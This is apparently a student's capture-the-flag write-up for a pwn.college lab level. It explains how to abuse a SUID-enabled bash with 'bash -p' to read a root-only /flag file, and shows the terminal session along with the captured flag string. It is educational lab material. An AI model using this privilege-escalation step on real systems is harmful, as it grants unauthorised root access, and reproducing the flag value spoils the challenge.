`bash`

https://www.freecodecamp.org/news/bash-scripting-tutorial-linux-shell-script-and-command-line-for-beginners/

The problem seems very very easy.
There are multiple ways of approach to solve this problem. As the `bash` is running as `SUID` and `bash` being the default interpreter of your Linux terminal, logic says if I write `cat /flag` it should print the flag.

Also we can write a simple `bash` script to print the content of the `flag` file, we can create a `test.sh` with `touch test.sh` and then `nano test.sh` and write this code:

```bash
while read -r line; 
do
    echo "$line";
done < /flag
```

or,

```bash
read -r line < /flag
echo $line
```

But every time it says `/flag: Permission denied`. Looks like it can't access the `flag` although the `bash` has been `SUID`.

Actually what is happening is that as the `SUID` has been set we are executing `bash` like `pseudo-root` but when `bash` sees that we are not actual `root` rather acting like a `root`, it drops the privileges that we achieved by `SUIDing` the `bash`. It's called `mitigation` which reduces the harm caused by `command injection` because most `command injection vulnerabilities end up hijacking /bin/sh`.

To disable `mitigation` , `bash -p [command]` is used.

Please the `lecture 3` of this module.

```bash
hacker@program-misuse-level-44:~$ /challenge/babysuid_level44 
Welcome to /challenge/babysuid_level44!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/bash.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level44) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/bash!
hacker@program-misuse-level-44:~$ cat /flag
cat: /flag: Permission denied
hacker@program-misuse-level-44:~$ touch test.sh
hacker@program-misuse-level-44:~$ ls -l test.sh
-rw-r--r-- 1 hacker hacker 0 Jan  3 15:57 test.sh
hacker@program-misuse-level-44:~$ nano test.sh
hacker@program-misuse-level-44:~$ ./test.sh
bash: ./test.sh: Permission denied
hacker@program-misuse-level-44:~$ ls -l test.sh
-rw-r--r-- 1 hacker hacker 50 Jan  3 15:59 test.sh
hacker@program-misuse-level-44:~$ chmod +x test.sh
hacker@program-misuse-level-44:~$ ls -l test.sh
-rwxr-xr-x 1 hacker hacker 50 Jan  3 15:59 test.sh
hacker@program-misuse-level-44:~$ ./test.sh 
./test.sh: line 4: /flag: Permission denied
hacker@program-misuse-level-44:~$ bash test.sh
test.sh: line 4: /flag: Permission denied
hacker@program-misuse-level-44:~$ cat /flag
cat: /flag: Permission denied
hacker@program-misuse-level-44:~$ bash -p
bash-5.0# cat /flag
pwn.college{EnObqOPRVwUqRJPeNZWBkiZTWwz.0lN4EDL0AjNzQzW}
bash-5.0# exit
exit
hacker@program-misuse-level-44:~$ bash -p test.sh
pwn.college{EnObqOPRVwUqRJPeNZWBkiZTWwz.0lN4EDL0AjNzQzW}
```